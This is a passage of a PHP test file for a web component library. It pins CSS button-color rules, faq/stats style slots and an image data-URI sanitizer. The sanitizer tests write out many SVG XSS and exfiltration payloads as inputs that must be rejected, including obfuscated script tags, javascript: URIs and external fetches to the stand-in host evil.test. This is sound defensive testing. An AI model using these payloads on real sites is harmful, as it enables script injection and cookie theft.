        $this->assertStringContainsString('class="hero__cta hero__cta--secondary btn btn--outline"', $html);
    }

    // ── CRITICAL regression: button enrichment must not break --cta-accent ──
    //
    // The shared .btn was tokenized with --btn-* defaults. Existing compositions
    // and the dark-bold/accent-framed recipes color the CTA button via the
    // component-scoped `.cta .btn { background-color: var(--cta-accent, ...) }`
    // override. This proves that path still works end to end: the slot still
    // renders as an inline custom property AND the CSS still consumes it.

    public function testCtaAccentOnlyCompositionStillRendersAccentCustomProperty(): void
    {
        $html = $this->render('cta', $this->ctaProps([
            '__pp_style' => ['--cta-accent' => '#ff0000'],
        ]));
        $this->assertStringContainsString('--cta-accent: #ff0000', $html);
    }

    public function testCtaBtnCssStillConsumesCtaAccentAfterEnrichment(): void
    {
        $css = file_get_contents(dirname(__DIR__) . '/assets/css/components.css');
        // Allow for the :not(.btn--outline):not(.btn--ghost):not(.btn--secondary)
        // exclusion clauses added between .btn and { by the #111 cascade-bug fix.
        $this->assertMatchesRegularExpression(
            '/\.cta\s+\.btn[^{]*\{[^}]*var\(\s*--cta-accent/s',
            $css,
            'The component-scoped .cta .btn override must still consume var(--cta-accent) '
            . 'after the shared button was tokenized — otherwise old compositions lose their color.'
        );
    }

    // ── Secondary/outline button cascade bug + per-instance slots (#111) ────

    public function testCtaAccentFillExcludesOutlineGhostSecondary(): void
    {
        // Regression guard: .cta .btn (2 classes, specificity 0,2,0) has HIGHER
        // specificity than .btn--outline/--ghost/--secondary (1 class each,
        // 0,1,0), so without this :not() exclusion the accent fill
        // unconditionally wins regardless of source order. Confirmed
        // empirically (Playwright): without the exclusion, outline and ghost
        // both render with button text the same color as the button
        // background (fully invisible).
        $css = file_get_contents(dirname(__DIR__) . '/assets/css/components.css');
        $this->assertMatchesRegularExpression(
            '/\.cta\s+\.btn:not\(\.btn--outline\):not\(\.btn--ghost\):not\(\.btn--secondary\)\s*\{[^}]*var\(\s*--cta-accent\b/s',
            $css,
            ".cta .btn's accent-fill rule must exclude outline/ghost/secondary via :not(), "
            . 'or those variants render with an invisible/wrong-colored button (#111).'
        );
    }

    public function testHeroAccentFillExcludesOutlineGhostSecondary(): void
    {
        // Same guard for hero's equivalent rule (this specific fix predates
        // #111 — pins it so a future refactor can't silently reintroduce it).
        $css = file_get_contents(dirname(__DIR__) . '/assets/css/components.css');
        $this->assertMatchesRegularExpression(
            '/\.hero\s+\.btn:not\(\.btn--outline\):not\(\.btn--ghost\):not\(\.btn--secondary\)\s*\{[^}]*var\(\s*--hero-accent\b/s',
            $css,
            ".hero .btn's accent-fill rule must exclude outline/ghost/secondary via :not()."
        );
    }

    public function testHeroSchemaDeclaresAllSixCta2Slots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/hero/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        foreach (['--hero-button2-bg', '--hero-button2-border', '--hero-button2-color', '--hero-button2-hover-bg', '--hero-button2-hover-border', '--hero-button2-hover-color'] as $name) {
            $this->assertArrayHasKey($name, $slots, "hero must declare {$name}.");
            $this->assertSame('color', $slots[$name]['type']);
        }
    }

    public function testCtaSchemaDeclaresAllSixButtonSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/cta/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        foreach (['--cta-button-bg', '--cta-button-border', '--cta-button-color', '--cta-button-hover-bg', '--cta-button-hover-border', '--cta-button-hover-color'] as $name) {
            $this->assertArrayHasKey($name, $slots, "cta must declare {$name}.");
            $this->assertSame('color', $slots[$name]['type']);
        }
    }

    public function testHeroCta2OverrideAppliesOnlyToSecondaryButton(): void
    {
        // The override must be scoped to .hero__cta--secondary, not leak onto
        // the primary button — even when the override is set, the primary's
        // rendered class list carries no such class.
        $html = $this->render('hero', $this->heroProps([
            '__pp_style' => ['--hero-button2-color' => '#00ff00'],
        ]));
        $this->assertStringContainsString('--hero-button2-color: #00ff00', $html);
        $this->assertStringContainsString('hero__cta hero__cta--secondary btn', $html);
        // Only ONE button should carry the secondary class.
        $this->assertSame(1, substr_count($html, 'hero__cta--secondary'));
    }

    public function testCtaButtonOverrideRenders(): void
    {
        $html = $this->render('cta', $this->ctaProps([
            'button_variant' => 'outline',
            '__pp_style' => ['--cta-button-bg' => '#ff00ff', '--cta-button-border' => '#ffff00'],
        ]));
        $this->assertStringContainsString('--cta-button-bg: #ff00ff', $html);
        $this->assertStringContainsString('--cta-button-border: #ffff00', $html);
    }

    public function testHeroCta2VariantsAllRouteThroughOverrideSlotsInCss(): void
    {
        // Comprehensive coverage beyond the keystone contract test's "at least
        // one compatible consumption" check — every one of the 4 variant-specific
        // rule blocks must reference --hero-button2-bg, not just one of them. Count the FILL
        // consumptions specifically: issue 526 adds a SECOND kind of reference (the cta2
        // isolation rule re-points --hero-button-bg at this slot, routing it into the
        // premium gradient-clearing chain), and one combined total would let a deleted
        // variant consumption hide behind an added reference of the other kind. That
        // declaration has its own pin in StyleSlotContractTest. Comments are stripped
        // because the prose around these rules names the slot repeatedly.
        $css = file_get_contents(dirname(__DIR__) . '/assets/css/components.css');
        $css = preg_replace('#/\*.*?\*/#s', '', $css);
        $this->assertSame(
            4,
            substr_count($css, 'background-color: var(--hero-button2-bg'),
            '--hero-button2-bg must be consumed as the fill in exactly 4 rules: the '
            . 'primary-shape rule plus outline/secondary/ghost — one per variant (#111).'
        );
    }

    public function testCtaButtonVariantsAllRouteThroughOverrideSlotsInCss(): void
    {
        $css = file_get_contents(dirname(__DIR__) . '/assets/css/components.css');
        // Strip /* */ comments first so the count reflects real CONSUMPTIONS, not comment
        // mentions of the token (issue 420 added a comment that names the slot, which a
        // raw-file substr_count would have wrongly tallied).
        $css = preg_replace('#/\*.*?\*/#s', '', $css);
        // Count real CONSUMPTIONS (`var(--cta-button-bg`), not comment mentions.
        // 4 in the `.cta__button` block — the primary-shape rule plus outline/secondary/
        // ghost, one per variant (#111) — PLUS 2 in the premium primary-fill cascade
        // winners (the "premium CTA treatment" and "elevation correction"
        // `main .btn:not(...)` rules), where issue 412 routes the gradient background
        // through the slot so a flat primary button is reachable on the DEFAULT variant —
        // PLUS 2 on the `.cta .btn:not(...)` rest rule (issue 420): its fill, and the fill
        // slot nested as the FALLBACK inside its border (`var(--cta-button-border,
        // var(--cta-button-bg, ...))`) so the border follows the fill when the border slot
        // is unset. `.cta .btn` is the [0,5,0] longhand winner that outranked BOTH of the
        // above layers for background-color/border-color and silently re-killed the slot.
        // PLUS 1 on the bg-image separation ring (issue 535). That rule overrides
        // `.cta .btn:not(...)`'s border on an overlay band, replacing ONLY the terminal
        // --color-accent with --color-accent-on-overlay; every authored link ahead of it,
        // including this fill slot, is carried over verbatim so a button an author already
        // recoloured keeps its matching ring instead of gaining a near-white one.
        $this->assertSame(
            9,
            substr_count($css, 'var(--cta-button-bg'),
            'var(--cta-button-bg) must be consumed by the 4 cta-block variant rules, the 2 '
            . 'premium primary-fill winners (issue 412), the .cta .btn rest rule twice '
            . '(fill + the fill nested in its border fallback, issue 420), and the '
            . '.cta--has-bg-image separation ring, which preserves that same border '
            . 'fallback chain ahead of the overlay role (issue 535).'
        );
    }

    // ── pp_esc_image_src (#36) ───────────────────────────────────────────────

    public function testEscImageSrcEmptyReturnsEmpty(): void
    {
        $this->assertSame('', pp_esc_image_src(''));
    }

    public function testEscImageSrcDelegatesToEscUrlForOrdinaryUrls(): void
    {
        $this->assertSame(esc_url('https://example.com/photo.jpg'), pp_esc_image_src('https://example.com/photo.jpg'));
        $this->assertSame(esc_url('/wp-content/uploads/photo.jpg'), pp_esc_image_src('/wp-content/uploads/photo.jpg'));
    }

    public function testEscImageSrcAcceptsRawSvgDataUri(): void
    {
        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>';
        $result = pp_esc_image_src($svg);
        $this->assertNotSame('', $result, 'A well-formed raw SVG data URI must not be rejected outright.');
        $this->assertStringStartsWith('data:image/svg+xml,', $result);
        // The dangerous-in-context characters must be percent-encoded...
        $this->assertStringNotContainsString('"', $result);
        $this->assertStringNotContainsString('<', $result);
        $this->assertStringNotContainsString('>', $result);
        // ...but the meaningful content is preserved (percent-decodes back):
        // '<' becomes %3C, the quote right after xmlns= becomes %22, and the
        // '=' itself is left alone (it's safe in both contexts already).
        $this->assertStringContainsString('%3Csvg', $result);
        $this->assertStringContainsString('xmlns=%22', $result);
    }

    public function testEscImageSrcAcceptsBase64PngDataUri(): void
    {
        $uri = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB';
        $this->assertSame($uri, pp_esc_image_src($uri));
    }

    public function testEscImageSrcAcceptsBase64SvgWithCharset(): void
    {
        $uri = 'data:image/svg+xml;charset=utf-8;base64,PHN2Zz48L3N2Zz4=';
        $this->assertSame($uri, pp_esc_image_src($uri));
    }

    public function testEscImageSrcRejectsNonImageMimeType(): void
    {
        $this->assertSame('', pp_esc_image_src('data:text/html,<script>alert(1)</script>'));
        $this->assertSame('', pp_esc_image_src('data:application/javascript,alert(1)'));
    }

    public function testEscImageSrcRejectsUnlistedImageSubtype(): void
    {
        // bmp/tiff are real image mime types but not in the allowlist.
        $this->assertSame('', pp_esc_image_src('data:image/bmp;base64,AAAA'));
    }

    public function testEscImageSrcRejectsInvalidBase64Payload(): void
    {
        $this->assertSame('', pp_esc_image_src('data:image/png;base64,not valid base64!!'));
        $this->assertSame('', pp_esc_image_src('data:image/png;base64,'));
    }

    public function testEscImageSrcRejectsEmbeddedScriptTag(): void
    {
        $this->assertSame(
            '',
            pp_esc_image_src('data:image/svg+xml,<svg><script>alert(document.cookie)</script></svg>')
        );
    }

    public function testEscImageSrcRejectsJavascriptUriInSvg(): void
    {
        $this->assertSame(
            '',
            pp_esc_image_src('data:image/svg+xml,<svg><a href="javascript:alert(1)">x</a></svg>')
        );
    }

    public function testEscImageSrcRejectsEventHandlerAttribute(): void
    {
        $this->assertSame(
            '',
            pp_esc_image_src('data:image/svg+xml,<svg onload="alert(1)"><circle r="5"/></svg>')
        );
    }

    public function testEscImageSrcRejectsForeignObjectIframeEmbedObject(): void
    {
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><foreignObject><body>x</body></foreignObject></svg>'));
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><iframe src="//evil.test"></iframe></svg>'));
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><embed src="//evil.test"/></svg>'));
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><object data="//evil.test"></object></svg>'));
    }

    public function testEscImageSrcRejectsOversizedDataUri(): void
    {
        $huge = 'data:image/png;base64,' . str_repeat('A', 2000000);
        $this->assertSame('', pp_esc_image_src($huge));
    }

    public function testEscImageSrcEncodedResultCannotBreakOutOfHtmlAttribute(): void
    {
        // A payload attempting to smuggle an attribute-breakout via a literal
        // quote must come back with that quote neutralized, not rejected
        // outright (rejection is reserved for actual script-executing
        // constructs) — proving the encoded output is safe to concatenate
        // directly into src="..." with no further escaping.
        $payload = 'data:image/svg+xml,<svg data-x="y"><circle r="5"/></svg>';
        $result = pp_esc_image_src($payload);
        $this->assertStringNotContainsString('"', $result);
    }

    // ── Cross-model adversarial review: confirmed bypasses of an earlier,
    // regex/blocklist-only version of this function ───────────────────────

    public function testEscImageSrcRejectsNewlineSplitScriptTag(): void
    {
        // "<scr" + newline + "ipt>" defeats a literal "<script" substring
        // search but is not valid XML either way (a tag name cannot contain
        // whitespace) — must still come back rejected, not silently
        // reconstituted into "<script>" by an output-stripping step.
        $payload = "data:image/svg+xml,<svg><scr\nipt>alert(1)</scr\nipt></svg>";
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsPercentEncodedScriptTag(): void
    {
        // The entire malicious payload pre-encoded so no literal "<script"
        // substring ever appears in the raw input — must be caught after
        // decoding, not waved through because the check ran too early.
        $payload = 'data:image/svg+xml,%3Csvg%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E%3C%2Fsvg%3E';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsDoubleEncodedScriptTag(): void
    {
        $payload = 'data:image/svg+xml,%253Csvg%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E%253C%252Fsvg%253E';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsNamespacePrefixedScriptTag(): void
    {
        // <x:script> where x is bound to the SVG namespace is equivalent to
        // <script> per XML namespace rules — a raw "<script" substring
        // search never sees it, but XPath's local-name() resolves the true
        // element name regardless of prefix.
        $payload = 'data:image/svg+xml,<svg xmlns:x="http://www.w3.org/2000/svg"><x:script>alert(1)</x:script></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsCharacterReferenceObfuscatedJavascriptUri(): void
    {
        // "jav&#x61;script:" contains no literal "javascript:" substring,
        // but a real XML parser resolves the numeric character reference
        // during parsing — by the time the attribute value is inspected,
        // it already reads "javascript:alert(1)".
        $payload = 'data:image/svg+xml,<svg><a href="jav&#x61;script:alert(1)">x</a></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsMaliciousContentInsideBase64Svg(): void
    {
        // The base64 alphabet is inert for HTML/CSS transport, but the SVG
        // it decodes to must still be scanned — "the alphabet is safe"
        // is not the same claim as "the decoded document is safe."
        $malicious = '<svg onload="alert(document.cookie)"><script>fetch(String.fromCharCode(47,47,101,118,105,108,46,116,101,115,116))</script></svg>';
        $payload = 'data:image/svg+xml;base64,' . base64_encode($malicious);
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsSvgWithDoctype(): void
    {
        // DOCTYPE is rejected outright rather than parsed "carefully" —
        // closes the external-entity/DTD attack surface unconditionally.
        $payload = "data:image/svg+xml,<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY x \"y\">]><svg>&x;</svg>";
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsMalformedXml(): void
    {
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><rect></svg>'));
    }

    public function testEscImageSrcAcceptsLegitimateMultilineFormattedSvg(): void
    {
        // Real-world hand-formatted/design-tool SVGs commonly span multiple
        // lines — this must not be treated as suspicious on its own.
        $svg = "data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <circle r=\"5\"/>\n</svg>";
        $result = pp_esc_image_src($svg);
        $this->assertNotSame('', $result);
    }

    // ── Second-round cross-model adversarial review: bypasses of the
    // DOMDocument-based rewrite ──────────────────────────────────────────

    public function testEscImageSrcRejectsSixLayerEncodedScriptTag(): void
    {
        // Six layers of percent-encoding must not survive a decode budget
        // that gives up too early — the loop must converge to a TRUE fixed
        // point (or reject outright), not just decode a fixed N rounds and
        // proceed on a still-partially-encoded string.
        $payload = '<svg><script>alert(1)</script></svg>';
        for ($i = 0; $i < 6; $i++) {
            $payload = rawurlencode($payload);
        }
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,' . $payload));
    }

    public function testEscImageSrcRejectsBackslashCssEscapedScriptTag(): void
    {
        // "\3c"/"\3e" are inert to an XML parser (just three ordinary
        // characters) but CSS's own url()-token tokenizer resolves
        // backslash-hex escapes independently of percent-decoding — this
        // reconstructs "<script>" only once the browser's CSS parser reads
        // the surrounding style="...url(...)..." attribute.
        $payload = 'data:image/svg+xml,<svg><rect data-x="\3cscript\3ealert(1)\3c/script\3e"/></svg>';
        $result = pp_esc_image_src($payload);
        $this->assertNotSame('', $result, 'A literal backslash in otherwise-safe SVG content should not be rejected outright.');
        $this->assertStringNotContainsString('\\', $result);
    }

    public function testEscImageSrcRejectsStyleElement(): void
    {
        // Unlike <script>, an SVG's own <style> element IS applied during
        // ordinary <img>/background-image rendering — an @import inside it
        // would exfiltrate on every page view, not just on a deliberate
        // "open image in new tab."
        $payload = 'data:image/svg+xml,<svg><style>@import url(https://evil.test/x.css);</style></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExternalHrefOnUseElement(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="https://evil.test/x.svg#y"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExternalHrefOnImageElement(): void
    {
        $payload = 'data:image/svg+xml,<svg><image href="https://evil.test/beacon.png"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcAcceptsSameDocumentFragmentHrefOnUseElement(): void
    {
        // A <use> referencing a locally-defined symbol is a legitimate,
        // common SVG pattern and must not be rejected.
        $payload = 'data:image/svg+xml,<svg><symbol id="icon"><circle r="5"/></symbol><use href="#icon"/></svg>';
        $this->assertNotSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsSmilAnimateRetargetingHref(): void
    {
        $payload = 'data:image/svg+xml,<svg><a id="x" href="https://safe.example/"><text>click</text></a>'
            . '<animate href="#x" attributeName="href" values="https://safe.example/;javascript:alert(1)" dur="1s"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsProcessingInstruction(): void
    {
        $payload = 'data:image/svg+xml,<?xml-stylesheet type="text/css" href="https://evil.test/x.css"?><svg><circle r="5"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsJavascriptUriWithEmbeddedNewline(): void
    {
        // Browser URL parsing strips embedded tab/newline/CR from anywhere
        // in a URL string, so "java\nscript:" resolves to "javascript:" at
        // navigation time even though no literal "javascript:" substring
        // (and no attribute value literally starting with it) exists in
        // the parsed DOM text.
        $payload = "data:image/svg+xml,<svg><a href=\"java&#x0A;script:alert(1)\">x</a></svg>";
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsDataTextHtmlHrefInsideSvg(): void
    {
        // A literal "<" inside an attribute value isn't valid XML, so the
        // nested script markup is XML-entity-escaped here, same as any
        // well-formed SVG author would have to write it.
        $payload = 'data:image/svg+xml,<svg><a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">x</a></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    // ── Third-round Codex review: empirically confirmed in a real browser
    // (Playwright/Chromium) that these attributes trigger real network
    // requests to an external host during ORDINARY rendering — no click,
    // no top-level navigation required ────────────────────────────────────

    public function testEscImageSrcRejectsExternalUrlInStyleFilter(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect style="filter:url(https://evil.test/filter.svg#f)"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExternalUrlInFilterAttribute(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect filter="url(https://evil.test/filter.svg#f)"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExternalUrlInFillAttribute(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(https://evil.test/pattern.svg#p)"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExternalUrlInStyleCursor(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect style="cursor:url(https://evil.test/cursor.png), auto"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcAcceptsSameDocumentFragmentUrlInFillAttribute(): void
    {
        // fill="url(#gradientId)" referencing a locally-defined gradient is
        // an extremely common, legitimate SVG pattern and must not be
        // rejected.
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"/></defs><rect fill="url(#g)"/></svg>';
        $this->assertNotSame('', pp_esc_image_src($payload));
    }

    // ── Fourth-round Claude adversarial review ──────────────────────────────

    public function testEscImageSrcRejectsExternalHrefOnFeImageElement(): void
    {
        // <feImage> is an SVG filter primitive whose entire purpose is
        // fetching an image resource — the same "fires on ordinary render"
        // exfiltration risk as <use>/<image>, but on a different element
        // name the original element-scoped fix didn't cover.
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
            . '<filter id="f"><feImage xlink:href="https://evil.test/beacon.png" x="0" y="0" width="10" height="10"/></filter>'
            . '<rect width="10" height="10" filter="url(#f)"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsNestedDataUriWithOnloadViaUseHref(): void
    {
        // A data: URI nested inside a <use href="..."> is validated
        // recursively — it's not automatically safe just because it's a
        // data: URI, since <use>'s clone-based reference model might treat
        // the referenced content as a live, scriptable subtree.
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg">'
            . '<use href="data:image/svg+xml,%3Csvg%20onload%3D%22alert(1)%22%2F%3E"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcAcceptsSameDocumentFragmentHrefOnPatternElement(): void
    {
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><defs><pattern id="p"/></defs><rect fill="url(#p)"/></svg>';
        $this->assertNotSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsExcessiveDataUriNestingDepth(): void
    {
        // Recursion depth guard: a data: URI nested inside a use/image href
        // is validated recursively (see the previous test) — that recursion
        // must be bounded rather than following an attacker-constructed
        // chain indefinitely. Exercised directly via the internal $depth
        // parameter (documented as "callers never need to pass this" —
        // ordinary callers always start at the default of 0).
        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>';
        $this->assertNotSame('', pp_esc_image_src($svg, 0), 'Sanity check: valid at depth 0.');
        $this->assertSame('', pp_esc_image_src($svg, 4), 'Must reject once the depth cap is exceeded.');
    }

    // ── Sixth-round Codex adversarial review (empirical Playwright) ─────────

    public function testEscImageSrcRejectsCssHexEscapedUrlFunctionName(): void
    {
        // Browsers resolve CSS Syntax Level 3 \XX hex escapes BEFORE
        // recognizing the "url" function name. fill="u\72l(...)" is not the
        // literal substring "url(" and evaded the plain regex scan for it,
        // but Chromium resolves \72 to "r" while parsing the value and
        // fetches the external resource exactly as if "url(" had been
        // written literally — confirmed empirically via Playwright against
        // both the raw and base64-encoded payload forms.
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">'
            . '<rect width="20" height="20" fill="u\72l(https://evil.test/p.svg#p)"/></svg>';
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,' . rawurlencode($svg)));
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml;base64,' . base64_encode($svg)));
    }

    public function testEscImageSrcRejectsCssNumericEscapedUrlFunctionName(): void
    {
        // Every character of "url" escaped individually (\75\72\6c), not
        // just one — the same bypass class, exercised at its most extreme.
        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">'
            . '<rect width="20" height="20" fill="\75\72\6c(https://evil.test/p.svg#p)"/></svg>';
        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,' . rawurlencode($svg)));
    }

    public function testEscImageSrcRejectsXmlBaseAttribute(): void
    {
        // xml:base (SVG/XML's equivalent of <base href>) can retarget a
        // "#fragment" reference — treated everywhere else in this function
        // as unconditionally same-document-safe — to resolve against an
        // attacker-controlled origin instead (RFC 3986 §5.3: a
        // fragment-only reference resolved against a base URL takes on the
        // base's scheme+authority+path). Rejected outright regardless of
        // whether a #fragment reference is even present.
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xml:base="https://evil.test/">'
            . '<rect width="10" height="10"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcRejectsXmlBaseWithFragmentReference(): void
    {
        // The concrete exploit shape: xml:base on the root plus a same-
        // document fill="url(#leak)" that would resolve externally.
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xml:base="https://evil.test/marker">'
            . '<defs><linearGradient id="leak"/></defs><rect width="10" height="10" fill="url(#leak)"/></svg>';
        $this->assertSame('', pp_esc_image_src($payload));
    }

    public function testEscImageSrcAcceptsSameDocumentFragmentAfterCssUnescape(): void
    {
        // The CSS-unescape pass must not turn a legitimate, safe reference
        // into a false-positive rejection — a literal backslash preceding a
        // non-hex character is a valid CSS "escaped character" that decodes
        // to that character itself, so this must still resolve to the
        // harmless local fragment reference "#g".
        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"/></defs>'
            . '<rect fill="ur\6c(#g)"/></svg>';
        $this->assertNotSame('', pp_esc_image_src($payload));
    }

    // ── faq / stats style slots (#100) ───────────────────────────────────

    private function faqProps(array $extra = []): array
    {
        return array_merge(['title' => 'FAQ', 'items' => [['question' => 'Q?', 'answer' => 'A.']]], $extra);
    }

    private function statsProps(array $extra = []): array
    {
        return array_merge(['title' => 'Stats', 'items' => [['number' => '40+', 'label' => 'Years']]], $extra);
    }

    /**
     * Both methods below are SUBSET checks over a NAMED slot list: each asserts the slot
     * exists, carries its declared type, has a `default` key and a non-empty description.
     * Neither asserts a COUNT. Their old names (…AllSevenStyleSlots / …AllFourStyleSlots)
     * carried pre-issue-100 numbers and had been wrong for many releases. Deliberately no
     * replacement count is quoted here: quoting one would re-create exactly the drift that
     * made the old names wrong. Issue 581 renamed them; the assertions are unchanged,
     * because they were never broken. Do not "repair" them into count assertions: a count
     * pin here would fight every legitimate slot addition for no coverage gain.
     */
    public function testFaqSchemaDeclaresItsNamedStyleSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/faq/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $expected = [
            '--faq-bg' => 'gradient',
            '--faq-item-bg' => 'gradient',
            '--faq-heading-color' => 'color',
            '--faq-question-color' => 'color',
            '--faq-answer-color' => 'color',
            '--faq-item-border-color' => 'color',
            '--faq-question-open-color' => 'color',
        ];
        foreach ($expected as $name => $type) {
            $this->assertArrayHasKey($name, $slots, "faq must declare {$name}.");
            $this->assertSame($type, $slots[$name]['type'], "{$name} must be type {$type}.");
            $this->assertArrayHasKey('default', $slots[$name]);
            $this->assertNotEmpty($slots[$name]['description']);
        }
    }

    public function testStatsSchemaDeclaresItsNamedStyleSlots(): void
    {
        $schema = json_decode(file_get_contents(dirname(__DIR__) . '/components/stats/schema.json'), true);
        $slots = $schema['styling']['style_slots'];
        $expected = [
            '--stats-bg' => 'gradient',
            '--stats-heading-color' => 'color',
            '--stats-number-color' => 'color',
            '--stats-label-color' => 'color',
        ];
        foreach ($expected as $name => $type) {
            $this->assertArrayHasKey($name, $slots, "stats must declare {$name}.");
            $this->assertSame($type, $slots[$name]['type'], "{$name} must be type {$type}.");
            $this->assertArrayHasKey('default', $slots[$name]);
            $this->assertNotEmpty($slots[$name]['description']);
        }
    }

    public function testFaqRendersHeadingColorSlot(): void
    {
        // The exact production regression #100 fixes: faq could not reach brand
        // fidelity on a dark surface because it had no --faq-heading-color slot.
        $html = $this->render('faq', array_merge($this->faqProps(), [
            '__pp_style' => ['--faq-heading-color' => '#ffffff'],
        ]));
        $this->assertStringContainsString('--faq-heading-color: #ffffff', $html);
    }

    public function testFaqRendersAllSevenSlots(): void
    {
        $overrides = [
            '--faq-bg' => 'linear-gradient(135deg, #1a1a2e, #16121f)',
            '--faq-item-bg' => '#222222',
            '--faq-heading-color' => '#ffffff',
            '--faq-question-color' => '#eeeeee',
            '--faq-answer-color' => '#cccccc',
            '--faq-item-border-color' => '#333333',
            '--faq-question-open-color' => '#ea3900',
        ];
        $html = $this->render('faq', array_merge($this->faqProps(), ['__pp_style' => $overrides]));
        foreach ($overrides as $slot => $value) {
            $this->assertStringContainsString("{$slot}: {$value}", $html, "{$slot} did not render.");
        }
    }

    public function testFaqRejectsInjectionInStyleSlot(): void
    {
        $html = $this->render('faq', array_merge($this->faqProps(), [
            '__pp_style' => ['--faq-heading-color' => '#fff; background:url(evil)'],
        ]));
        $this->assertStringNotContainsString('url(evil)', $html);
    }

    // ── faq id / eyebrow / theme (#231) — parity with heading components ──

    public function testFaqRendersIdForAnchorLinking(): void
    {
        // #231: faq is a heading component and must be anchor-linkable, like every
        // other one. The id lands on the section element so `#faq` has a target.
        $html = $this->render('faq', $this->faqProps(['id' => 'faq']));
        $this->assertStringContainsString('<section id="faq"', $html);
    }

    public function testFaqOmitsIdAttributeWhenUnset(): void
    {
        $html = $this->render('faq', $this->faqProps());
        $this->assertStringNotContainsString('<section id=', $html);
    }

    public function testFaqEyebrowRendersAsPill(): void
    {
        $html = $this->render('faq', $this->faqProps(['eyebrow' => 'KICKER']));
        $this->assertStringContainsString('class="faq__eyebrow">KICKER<', $html);
    }

    public function testFaqEyebrowOmittedWhenUnset(): void
    {
        $html = $this->render('faq', $this->faqProps());
        $this->assertStringNotContainsString('faq__eyebrow', $html);
    }

    public function testFaqEyebrowColorSlotsRender(): void
    {
        $html = $this->render('faq', $this->faqProps([
            'eyebrow' => 'KICKER',
            '__pp_style' => ['--faq-eyebrow-color' => '#ffffff', '--faq-eyebrow-bg' => '#111111'],
        ]));
        $this->assertStringContainsString('--faq-eyebrow-color: #ffffff', $html);
        $this->assertStringContainsString('--faq-eyebrow-bg: #111111', $html);
    }

    public function testFaqInvertedThemeAddsClass(): void
    {
        $html = $this->render('faq', $this->faqProps(['theme' => 'inverted']));
        $this->assertStringContainsString('class="faq faq--inverted"', $html);
    }

    public function testFaqDefaultThemeAddsNoModifierClass(): void
    {
